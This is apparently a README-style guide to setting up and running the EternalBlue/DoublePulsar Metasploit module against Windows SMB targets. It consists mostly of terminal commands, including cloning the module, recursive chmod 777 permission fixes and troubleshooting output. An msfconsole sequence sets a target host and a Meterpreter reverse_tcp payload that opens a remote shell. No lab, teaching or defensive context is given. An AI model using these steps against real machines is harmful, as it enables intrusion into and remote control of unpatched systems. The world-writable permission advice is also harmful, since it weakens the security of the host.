#### Eternalblue-Doublepulsar-Metasploit Exploit Setup and Usage

This repository contains the Metasploit module and dependencies to run the Eternalblue Doublepulsar exploit on Windows targets.

---

#### Prerequisites

- Kali Linux (or compatible)
- Metasploit Framework installed
- Wine installed and configured
- Root privileges to manage files and permissions

---

#### Full Setup & Usage (Terminal Commands)

```
# Clone the Eternalblue-Doublepulsar-Metasploit repository
git clone https://github.com/your-repo/Eternalblue-Doublepulsar-Metasploit.git /root/Eternalblue-Doublepulsar-Metasploit

# Fix permissions for deps and wine drive_c folder
chmod -R 777 /root/Eternalblue-Doublepulsar-Metasploit/deps/
chmod -R 777 /root/.wine/drive_c/

# Create the eternal11.dll payload file and give full permissions
touch /root/.wine/drive_c/eternal11.dll
chmod 777 /root/.wine/drive_c/eternal11.dll

# If permission denied errors persist, copy deps folder to a new location with full permissions
mkdir -p /opt/ebdp/deps
cp -r /root/Eternalblue-Doublepulsar-Metasploit/deps/* /opt/ebdp/deps/
touch /opt/ebdp/eternal11.dll
chmod -R 777 /opt/ebdp
```
# Start Metasploit Framework
msfconsole

### Inside msfconsole:

```

use exploit/windows/smb/eternalblue_doublepulsar

set RHOSTS <TARGET_IP>          # Example: 192.168.1.100
- Note: LHOST is omitted here as per your setup (add if needed)
set DOUBLEPULSARPATH /opt/ebdp/deps/
set ETERNALBLUEPATH /opt/ebdp/deps/
set WINEPATH /opt/ebdp/

set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOADFILE lass.exe

run
```

#### Issues Faced & Solutions

* Permission Denied on XML Files
```
cp: cannot stat '/root/Eternalblue-Doublepulsar-Metasploit/deps//Eternalblue-2.2.0.Skeleton.xml': Permission denied
sed: can't read /root/Eternalblue-Doublepulsar-Metasploit/deps//Eternalblue-2.2.0.xml: Permission denied
```
- Occurred despite setting 755 permissions. Fixed by changing recursively to 777:
```
chmod -R 777 /root/Eternalblue-Doublepulsar-Metasploit/deps/
```
- Permission Denied Writing Payload DLL
```
Exploit failed: Errno::EACCES Permission denied @ rb_sysopen - /root/.wine/drive_c/eternal11.dll
```
- Fixed by creating the file and setting full permissions:
```
touch /root/.wine/drive_c/eternal11.dll
chmod 777 /root/.wine/drive_c/eternal11.dll
chmod 777 /root/.wine/drive_c/
```

#### Persisting Permission Errors
- Despite fixes above, errors persisted. Solution was to copy the dependencies and DLL to a new directory with full permissions:
```
mkdir -p /opt/ebdp/deps
cp -r /root/Eternalblue-Doublepulsar-Metasploit/deps/* /opt/ebdp/deps/
touch /opt/ebdp/eternal11.dll
chmod -R 777 /opt/ebdp
```